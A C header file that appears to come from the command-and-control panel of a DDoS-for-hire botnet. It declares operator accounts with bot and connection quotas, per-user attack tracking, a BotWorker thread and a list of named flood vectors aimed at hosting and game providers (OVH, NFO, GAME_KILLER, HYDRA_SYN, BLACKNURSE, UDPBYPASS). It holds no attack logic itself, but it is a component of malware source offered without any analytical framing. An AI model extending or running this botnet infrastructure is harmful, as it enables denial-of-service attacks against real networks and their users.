#pragma once

#include <stdint.h>
#include <pthread.h>
#include "includes.h"

struct login_info
{
    char username[20];
    char password[20];
    char level[20];
	char expiry[64];
    char max_bots[20];
    char max_conns[20];
};

struct telnetdata_attk_t
{
    int end_time;
    int running;
};

struct telnetdata_t
{
	struct login_info *login;
    struct telnetdata_attk_t **attks;
    int attks_len;
	unsigned char username[64];
	uint32_t addr;
	uint8_t connected;
	uint8_t authed;
	uint8_t rtlog;
	uint8_t is_admin;
	uint8_t is_chatroom;
	// needs another uint8 for correct struct packing
	pthread_t main_thr;
	pthread_t titlewriter_thr;
};

enum {
	ATTACK_VECTOR_OVH,
	ATTACK_VECTOR_NFO_V6,
	ATTACK_VECTOR_GAME_KILLER,
	ATTACK_VECOTR_UDP_RAW,
	ATTACK_VECOTR_OVH_RAW,
	ATTACK_VECOTR_RAND_HEX,
	ATTACK_VECOTR_KAFFER_SLAP,
	ATTACK_VECOTR_HYDRA_SYN,
	ATTACK_VECOTR_STOMP,
	ATTACK_VECOTR_JUNK,
	ATTACK_VECOTR_STD,
	ATTACK_VECOTR_XMAS,
	ATTACK_VECTOR_ICMPFLOOD,
	ATTACK_VECTOR_OPENVPN,
	ATTACK_VECTOR_CHOOPA,
	ATTACK_VECTOR_UDPBYPASS,
	ATTACK_VECTOR_BLACKNURSE,
	ATTACK_VECTOR_TLS,
	ATTACK_VECTOR_COUNT
};

struct attack_vector_t {
	uint8_t vector;
	char name[16];
	char args[64];
};


int admin_get_motd_lines();
int admin_get_motd(char *, int);
struct telnetdata_t *admin_retrieve_user_fd(int);
struct telnetdata_t *admin_retrieve_users();
void admin_init_vectors(void);
void *TitleWriter(void *);
void admin_log_cmd(char *, int);
void *BotWorker(void *);

